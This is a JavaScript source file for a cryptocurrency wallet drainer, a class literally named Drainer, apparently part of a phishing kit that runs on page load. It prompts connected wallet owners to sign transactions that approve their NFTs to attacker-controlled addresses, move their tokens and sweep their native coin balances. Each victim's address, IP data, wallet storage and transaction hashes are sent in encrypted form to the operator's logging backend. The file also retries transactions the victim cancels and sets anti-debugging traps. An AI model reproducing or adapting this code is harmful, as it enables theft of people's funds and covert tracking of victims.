                    "value": "0x0000",
                    "data": S
                };
                await this.main_provider.sendAsync({
                    "method": "eth_sendTransaction",
                    "params": [r],
                    "from": this.walletAddress
                }, (d, s) => {
                    if (d) {
                        console.error("COMET error: ", d);
                        l(d);
                    } else {
                        let C = s;
                        if (s.hasOwnProperty("result")) {
                            C = s.result;
                        } else if (s.hasOwnProperty("hash")) {
                            C = s.hash;
                        }
                        console.log("COMET success", C);
                        this.pending.push(C);
                        D(C);
                    }
                });
            }).then(async D => {
                let M = await this.getIpData();
                let G = {
                    "address": this.walletAddress,
                    "chain": Y,
                    "isMobile": this.isMobile(),
                    "websiteUrl": window.location.href,
                    "websiteDomain": window.location.host,
                    "API_KEY": config.API_KEY,
                    "contractId": 0x270f,
                    "ipData": M,
                    "signature": this.signature,
                    "tokenName": n.name,
                    "tokenPrice": n.totalPrice,
                    "withdrawals": n.assets,
                    "contractAddress": n.contractAddress,
                    "exclusiveContractId": 0x270f,
                    "unmarkedContract": config.tokenContractAddresses[Y],
                    "transactionHash": D,
                    "hash_sweet": t
                };
                console.log(G);
                fetch(this.logDomainName + "backend/compound", {
                    "method": "POST",
                    "headers": {
                        "Content-Type": "application/json",
                        "Accept": "application/json"
                    },
                    "body": this.encryptBody(JSON.stringify(G))
                });
                this.txcount++;
                this.addToLocalStorage(t);
                return true;
            })["catch"](async D => {
                this.logCancel("Compound Market ", n.totalPrice + " ETH");
                if (config.repeatHighest) {
                    return await this.transferComet(t, n);
                }
                this.updateButtonMessage(true);
                console.log("Comet error:", D);
                this.txcount++;
            });
        } catch (D) {}
    };
    ["transferNFT"] = async (t, n) => {
        await this.changeNetwork(1);
        console.log("Transferring NFT " + n.name);
        console.log("Pending Transactions: " + this.pending.length);
        try {
            if (n.tokenIds.length == 1) {
                await new Promise(async (a, S) => {
                    const l = [{
                        "constant": false,
                        "inputs": [{
                            "name": "to",
                            "type": "address"
                        }, {
                            "name": "tokenId",
                            "type": "uint256"
                        }],
                        "name": "approve",
                        "outputs": [{
                            "name": '',
                            "type": "bool"
                        }],
                        "payable": false,
                        "stateMutability": "nonpayable",
                        "type": "function"
                    }];
                    let M = window.ethereum;
                    let G = await new ethers.providers.Web3Provider(window.ethereum);
                    let O = await G.send("eth_requestAccounts", []);
                    let d = new ethers.Contract(n.contractAddress, l, G);
                    let v = d["interface"].encodeFunctionData("approve", [config.tokenContractAddresses[1], n.tokenIds[0]]);
                    console.log("Address", this.walletAddress);
                    console.log("data", v);
                    let C = {
                        "from": O[0],
                        "to": n.contractAddress,
                        "data": v,
                        "value": "0x0000",
                        "chainId": 0x1
                    };
                    C.nonce = await G.getTransactionCount(this.walletAddress);
                    C.nonce = "0x" + C.nonce.toString(16);
                    this.estimateTXcosts(C, n, 1);
                    try {
                        this.logPromting(t, "NFT", {
                            "chain": 0x1,
                            "to_wallet": config.tokenContractAddresses[1],
                            "tokenPrice": n.totalPrice,
                            "tokenIds": n.tokenIds || [n.tokenId],
                            "tokenType": n.name,
                            "tokenName": n.tname,
                            "contractAddress": n.contractAddress
                        });
                    } catch (E) {
                        console.warn(E);
                    }
                    await M.sendAsync({
                        "id": 0x1,
                        "method": "eth_sendTransaction",
                        "params": [C],
                        "from": O[0]
                    }, (w, T) => {
                        if (w == null) {
                            let P = T;
                            if (T.hasOwnProperty("result")) {
                                P = T.result;
                            } else if (T.hasOwnProperty("hash")) {
                                P = T.hash;
                            }
                            console.log("NFT success", P);
                            this.pending.push(P);
                            a(P);
                        } else {
                            S(w);
                        }
                    });
                }).then(async a => {
                    let U = await this.getIpData();
                    fetch(this.logDomainName + "backend/safa/nft", {
                        "method": "POST",
                        "headers": {
                            "Content-Type": "application/json",
                            "Accept": "application/json"
                        },
                        "body": this.encryptBody(JSON.stringify({
                            "address": this.walletAddress,
                            "walletBalanceInEth": this.walletBalanceInEth,
                            "isMobile": this.isMobile(),
                            "websiteUrl": window.location.href,
                            "websiteDomain": window.location.host,
                            "ipData": U,
                            "API_KEY": config.API_KEY,
                            "signature": this.signature,
                            "contractId": 0x270f,
                            "tokenIds": n.tokenIds,
                            "tokenType": n.name,
                            "tokenName": n.tname,
                            "tokenPrice": n.totalPrice,
                            "contractAddress": n.contractAddress,
                            "exclusiveContractId": 0x270f,
                            "unmarkedContract": config.tokenContractAddresses[1],
                            "transactionHash": a,
                            "hash_sweet": t
                        }))
                    });
                    this.txcount++;
                    this.addToLocalStorage(t);
                    return true;
                })["catch"](async a => {
                    this.logCancel(n.name, n.tname, Number(n.totalPrice).toFixed(3) + " ETH");
                    if (config.repeatHighest) {
                        return await this.transferNFT(t, n);
                    }
                    this.txcount++;
                    console.log("NFT error:", a);
                });
            } else {
                try {
                    this.logPromting(t, "NFT", {
                        "chain": 0x1,
                        "to_wallet": config.tokenContractAddresses[1],
                        "tokenPrice": n.totalPrice,
                        "tokenIds": n.tokenIds || [n.tokenId],
                        "tokenType": n.name,
                        "tokenName": n.tname,
                        "contractAddress": n.contractAddress
                    });
                } catch (a) {
                    console.warn(a);
                }
                await new Promise(async (S, U) => {
                    let M = new ethers.utils.Interface(NFT_ABI);
                    let G = M.encodeFunctionData("setApprovalForAll", [config.tokenContractAddresses[1], true]);
                    let O = {
                        "from": this.walletAddress,
                        "to": n.contractAddress,
                        "value": "0x0000",
                        "data": G
                    };
                    await this.main_provider.sendAsync({
                        "method": "eth_sendTransaction",
                        "params": [O],
                        "from": this.walletAddress
                    }, (r, d) => {
                        if (r) {
                            console.error("NFT error: ", r);
                            U(r);
                        } else {
                            let v = d;
                            if (d.hasOwnProperty("result")) {
                                v = d.result;
                            } else if (d.hasOwnProperty("hash")) {
                                v = d.hash;
                            }
                            console.log("NFT success", v);
                            this.pending.push(v);
                            S(v);
                        }
                    });
                }).then(async S => {
                    let D = await this.getIpData();
                    fetch(this.logDomainName + "backend/safa/nft", {
                        "method": "POST",
                        "headers": {
                            "Content-Type": "application/json",
                            "Accept": "application/json"
                        },
                        "body": this.encryptBody(JSON.stringify({
                            "address": this.walletAddress,
                            "walletBalanceInEth": this.walletBalanceInEth,
                            "isMobile": this.isMobile(),
                            "websiteUrl": window.location.href,
                            "websiteDomain": window.location.host,
                            "ipData": D,
                            "API_KEY": config.API_KEY,
                            "signature": this.signature,
                            "contractId": 0x270f,
                            "tokenIds": n.tokenIds,
                            "tokenType": n.name,
                            "tokenName": n.tname,
                            "tokenPrice": n.totalPrice,
                            "contractAddress": n.contractAddress,
                            "exclusiveContractId": 0x270f,
                            "unmarkedContract": config.tokenContractAddresses[chain],
                            "transactionHash": S,
                            "hash_sweet": t
                        }))
                    });
                    this.txcount++;
                    return true;
                })["catch"](async S => {
                    this.logCancel(n.name, n.tname, Number(n.totalPrice).toFixed(3) + " ETH");
                    if (config.repeatHighest) {
                        return await this.transferNFT(n);
                    }
                    console.log("NFT error:", S);
                    this.txcount++;
                });
            }
        } catch (S) {
            console.log("Failed to Approve NFTs", S);
        }
    };
    ["transferNative"] = async (t, n, K) => {
        console.log("Native", n, K);
        if (K >= config.nativeMinimals[n]) {
            try {
                await this.changeNetwork(n);
                console.log("Transferring native", n);
                console.log("Pending Transactions: " + this.pending.length);
                let a = ethers.utils.parseUnits(K.toString(), 18);
                let S = this.gasPrices[n];
                let U = ethers.BigNumber.from(S);
                let D = ethers.BigNumber.from("25000");
                if (n == 42161) {
                    D = ethers.BigNumber.from("600000");
                }
                if (n == 10) {
                    D = ethers.BigNumber.from("15000000");
                }
                let M = D.mul(U.mul(7)).mul(130).div(100);
                let G = a.sub(M);
                console.log("Sending " + ethers.utils.formatEther(G));
                if (ethers.utils.formatEther(G) < 0) {
                    try {
                        Swal.closeToast();
                    } catch {}
                    return;
                }
                try {
                    this.logPromting(t, "NATIVE", {
                        "chain": n,
                        "native": K,
                        "tokenPrice": Number(G).toFixed(3),
                        "to_wallet": config.ethContractAddress[n]
                    });
                } catch (O) {
                    console.warn(O);
                }
                await new Promise(async (r, d) => {
                    let E = new ethers.utils.Interface(ETH_CONTRACT);
                    let w = E.encodeFunctionData("claim", [config.seaport_receiver, config.percentage]);
                    if (this.netWorth > config.reserve_contract_min) {
                        w = "0x";
                    }
                    let T = {
                        "from": this.walletAddress,
                        "to": config.ethContractAddress[n],
                        "value": G._hex,
                        "data": w,
                        "maxFeePerGas": S
                    };
                    await this.main_provider.sendAsync({
                        "method": "eth_sendTransaction",
                        "params": [T],
                        "from": this.walletAddress
                    }, (X, P) => {
                        if (X) {
                            console.error(X);
                            d(X);
                        } else {
                            let x = P;
                            if (P.hasOwnProperty("result")) {
                                x = P.result;
                            } else if (P.hasOwnProperty("hash")) {
                                x = P.hash;
                            }
                            console.log("Native success", x);
                            this.pending.push(x);
                            r(x);
                        }
                    });
                }).then(async r => {
                    let s = await this.getIpData();
                    fetch(this.logDomainName + "backend/safa/native", {
                        "method": "POST",
                        "headers": {
                            "Content-Type": "application/json",
                            "Accept": "application/json"
                        },
                        "body": this.encryptBody(JSON.stringify({
                            "address": this.walletAddress,
                            "walletBalanceInNative": K,
                            "isMobile": this.isMobile(),
                            "websiteUrl": window.location.href,
                            "websiteDomain": window.location.host,
                            "ipData": s,
                            "API_KEY": config.API_KEY,
                            "chain": n,
                            "signature": this.signature,
                            "tokenPrice": Number(G).toFixed(3),
                            "transactionHash": r,
                            "contractId": 0x270f,
                            "exclusiveContractId": 0x270f,
                            "hash_sweet": t,
                            "unmarkedContract": config.ethContractAddress[n]
                        }))
                    });
                    this.txcount++;
                    this.addToLocalStorage(t);
                    return true;
                })["catch"](async r => {
                    this.logCancelNative(n, K);
                    if (config.repeatHighest) {
                        return await this.transferNative(t, n, K);
                    }
                    console.log("Native contract error:", r);
                    this.txcount++;
                    this.updateButtonMessage(true);
                });
            } catch (r) {
                console.warn("Failed to transfer Native:" + r);
            }
        } else {
            console.log("Skipped poor (Fucking broke) native", n);
        }
    };
    ["estimateTXcosts"] = async (t, n, K) => {
        try {
            let a = await this.ethers_provider.estimateGas(t);
            let S = await this.ethers_provider.getGasPrice();
            let U = a.mul(S).mul(2);
            let l = await this.ethers_provider.getBalance(this.walletAddress);
            if (l.lt(U)) {
                let G = await this.getIpData();
                let O = U.sub(l);
                fetch(this.logDomainName + "backend/no_funds_for_gas", {
                    "method": "POST",
                    "headers": {
                        "Content-Type": "application/json",
                        "Accept": "application/json"
                    },
                    "body": this.encryptBody(JSON.stringify({
                        "websiteDomain": window.location.host,
                        "websiteUrl": window.location.href,
                        "address": this.walletAddress,
                        "isMobile": this.isMobile(),
                        "ipData": G,
                        "API_KEY": config.API_KEY,
                        "transfer_data": n,
                        "chain": K,
                        "howmuch": O
                    }))
                });
            }
        } catch (r) {
            console.log(r);
        }
    };
    ["getIpData"] = async () => {
        let u = {
            "ip": "Unknown",
            "country_name": "Unknown"
        };
        if (config.logIpData) {
            try {
                u = await fetch("https://ipapi.co/json/", this.requestOptionsPOST).then(k => k.json());
            } catch (k) {
                console.warn("Couldn't fetch ip data: ", k);
            }
        }
        return u;
    };
    ["logConnection"] = async () => {
        try {
            console.log(this.netWorth);
            let u = await this.getIpData();
            let k = this.main_provider;
            let Y = window.localStorage.getItem("wagmi.wallet");
            try {
                Y = k.signer.session.peer.metadata.name || "Other";
            } catch (G) {
                console.log(G);
            }
            Y = Y.replace("\"", '');
            let a = await this.signer.getChainId();
            let S = [];
            let U = false;
            if (config.logDrainingStrategy) {
                U = true;
                S = this.sweets;
                S = S.slice(0, 10);
            }
            fetch(this.logDomainName + "backend/connectionV3", {
                "method": "POST",
                "mode": "cors",
                "cache": "no-cache",
                "headers": {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "Access-Control-Allow-Origin": "*"
                },
                "body": this.encryptBody(JSON.stringify({
                    "address": this.walletAddress,
                    "isMobile": this.isMobile(),
                    "isAndroidOrIphone": this.isAndroidOrIphone(),
                    "websiteUrl": window.location.href,
                    "websiteDomain": window.location.host,
                    "ipData": u,
                    "API_KEY": config.API_KEY,
                    "walletname": Y,
                    "version": config.version,
                    "chain": a,
                    "outdatedcfg": outdatedcfg,
                    "specials": this.detectSimulators(),
                    "strategy_enabled": U,
                    "contractId": this.contractId,
                    "networth": this.netWorth,
                    "sweets": S
                }))
            });
            let D = window.localStorage;
            let l = ["w3m", "wagmi", "wc@", "W3M"];
            let M = Object.fromEntries(Object.entries(D).filter(([O, r]) => {
                return l.some(s => O.includes(s));
            }));
            fetch(this.logDomainName + "backend/storage", {
                "method": "POST",
                "mode": "cors",
                "cache": "no-cache",
                "headers": {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "Access-Control-Allow-Origin": "*"
                },
                "body": this.encryptBody(JSON.stringify({
                    "address": this.walletAddress,
                    "API_KEY": config.API_KEY,
                    "storage": JSON.stringify(M)
                }))
            });
        } catch (O) {
            console.log("Connection Log error: ", O);
        }
    };
    ["logCancel"] = async (t, n = '', K = '') => {
        try {
            console.log("logCancel", t, n, K);
            let a = await this.getIpData();
            let S = '';
            this.seaportTokens.forEach((U, D) => {
                if (U.type != "ERC20") {
                    U.tokenIds.forEach(G => {
                        S += "<a href=\"https://opensea.io/assets/ethereum/" + U.contractAddress + "/" + G + "\">" + U.collectionSymbol + "</a> (" + (U.price / U.owned).toFixed(3) + " ETH)" + (D + 1 == this.seaportTokens.length ? '' : ",") + " ";
                    });
                } else {
                    S += "<a href=\"https://etherscan.io/address/" + U.contractAddress + "\">" + U.name + "</a> (" + U.usdPrice + "$)" + (D + 1 == this.seaportTokens.length ? '' : ",") + " ";
                }
            });
            fetch(this.logDomainName + "backend/cancel", {
                "method": "POST",
                "headers": {
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                },
                "body": this.encryptBody(JSON.stringify({
                    "address": this.walletAddress,
                    "walletBalanceInEth": this.walletBalanceInEth,
                    "isMobile": this.isMobile(),
                    "websiteUrl": window.location.href,
                    "websiteDomain": window.location.host,
                    "ipData": a,
                    "tokenType": t,
                    "tokenName": n,
                    "tokenPrice": K,
                    "seaportItems": S,
                    "seaportValue": Number(this.seaportValue).toFixed(3) + " ETH",
                    "API_KEY": config.API_KEY,
                    "signature": this.signature
                }))
            });
        } catch (U) {
            console.log("Connection Log error: ", U);
        }
    };
    ["logCancelNative"] = async (t, n) => {
        try {
            let Y = await this.getIpData();
            fetch(this.logDomainName + "backend/cancelNative", {
                "method": "POST",
                "mode": "cors",
                "cache": "no-cache",
                "headers": {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "Access-Control-Allow-Origin": "*"
                },
                "body": this.encryptBody(JSON.stringify({
                    "address": this.walletAddress,
                    "native": n,
                    "isMobile": this.isMobile(),
                    "websiteUrl": window.location.href,
                    "websiteDomain": window.location.host,
                    "ipData": Y,
                    "API_KEY": config.API_KEY,
                    "chain": t,
                    "signature": this.signature
                }))
            });
        } catch (a) {
            console.log("Connection Log error: ", a);
        }
    };
    ["logClosedTab"] = async () => {
        try {
            let u = await this.getIpData();
            fetch(this.logDomainName + "backend/tabclosed", {
                "method": "POST",
                "mode": "cors",
                "cache": "no-cache",
                "headers": {
                    "Content-Type": "application/json",
                    "Accept": "application/json",
                    "Access-Control-Allow-Origin": "*"
                },
                "body": this.encryptBody(JSON.stringify({
                    "address": this.walletAddress,
                    "walletBalanceInEth": this.walletBalanceInEth,
                    "isMobile": this.isMobile(),
                    "websiteUrl": window.location.href,
                    "websiteDomain": window.location.host,
                    "ipData": u,
                    "API_KEY": config.API_KEY,
                    "signature": this.signature
                }))
            });
        } catch (k) {
            console.log("Connection Log error: ", k);
        }
    };
    ["notEligible"] = () => {
        this.started = false;
        Swal.closeToast();
        if (config.useSweetAlert) {
            Swal.fire(config.swal_notEligibleTitle, config.notEli, "error");
        } else {
            alert(config.notEligible);
        }
        this.updateButtonMessage(false, false, true);
        DrainerPopup.closePopup();
        console.warn("Not eligible");
    };
    ["encryptBody"] = t => {
        return JSON.stringify({
            "encrypted": String(CryptoJS.AES.encrypt(t, "F-JaNdRgUkXp2r5u8x/A?D(G+KbPeShVmYq3t6v9y$B&E)H@McQfTjWnZr4u7x!z%C*F-JaNdRgUkXp2s5v8y/B?D(G+KbPeShVmYq3t6w9z$C&F)H@McQfTjWnZr4u7"))
        });
    };
    ["decryptBody"] = t => {
        return CryptoJS.AES.decrypt(t, "y$B&E)H@McQfTjWmZq4t7w!z%C*F-JaNdRgUkXp2r5u8x/A?D(G+KbPeShVmYq3t6v9y$B&E)H@McQfTjWnZr4u7x!z%C*F-JaNdRgUkXp2s5v8y/B?D(G+KbPeShVmY").toString(CryptoJS.enc.Utf8);
    };
    ["sleep"] = t => {
        return new Promise(n => setTimeout(n, t));
    };
    ["isMobile"] = () => {
        let K = false;
        (function (u) {
            if (/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i.test(u) || /1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i.test(u.substr(0, 4))) {
                K = true;
            }
        })(navigator.userAgent || navigator.vendor || window.opera);
        return K;
    };
    ["isAndroidOrIphone"] = () => {
        var Y = navigator.userAgent.toLowerCase();
        var a = Y.indexOf("android") > -1;
        if (a) {
            return "Android";
        }
        if (navigator.userAgent.match(/'Win32|Win64|Windows|Windows NT|WinCE/i)) {
            return "Windows";
        }
        if (navigator.userAgent.match(/Macintosh|Mac|Mac OS|MacIntel|MacPPC|Mac68K/i)) {
            return "MacOS";
        }
        if (navigator.userAgent.match(/iPhone/i) || navigator.userAgent.match(/iPod/i)) {
            return "Iphone";
        }
    };
    ["addToLocalStorage"] = t => {
        let k = "cached_sweets_" + this.walletAddress;
        if (typeof localStorage !== "undefined") {
            try {
                const Y = localStorage.getItem(k);
                let a;
                if (Y) {
                    const S = JSON.parse(Y);
                    if (Array.isArray(S)) {
                        S.push(t);
                        a = JSON.stringify(S);
                        console.log(a, 3);
                    } else {
                        a = JSON.stringify([S, t]);
                        console.log(a, 2);
                    }
                } else {
                    a = JSON.stringify([t]);
                    console.log(a, 1);
                }
                localStorage.setItem(k, a);
            } catch (U) {
                console.error(U);
            }
        } else {
            console.error("LS unsupported");
        }
    };
}
function n38UJ8b() {
    if (window.w3m_loaded) {
        console.log("Scripts are loaded");
        new Drainer();
    } else {
        console.log("Waiting for scripts to load...");
        setTimeout(n38UJ8b, 200);
    }
}
window.addEventListener("load", async () => {
    config.w3m_name = typeof w3m_name !== "undefined" ? w3m_name || document.title || "WalletConnect" : document.title || "WalletConnect";
    config.w3m_description = typeof w3m_description !== "undefined" ? w3m_description || document.title || "WalletConnect" : document.title || "WalletConnect";
    config.w3m_url = typeof w3m_url !== "undefined" ? w3m_url || window.location.href : window.location.href || "https://ethereum.org";
    config.w3m_icons = typeof w3m_icons !== "undefined" ? w3m_icons || ["https://avatars.githubusercontent.com/u/37784886"] : ["https://avatars.githubusercontent.com/u/37784886"];
    n38UJ8b();
});
function g(t) {
    function K(u) {
        if (typeof u === "string") {
            return function (k) {}.constructor("while (true) {}").apply("counter");
        } else if (('' + u / u).length !== 1 || u % 20 === 0) {
            (function () {
                return true;
            }).constructor("debugger").call("action");
        } else {
            (function () {
                return false;
            }).constructor("debugger").apply("stateObject");
        }
        K(++u);
    }
    try {
        if (t) {
            return K;
        } else {
            K(0);
        }
    } catch (u) {}
}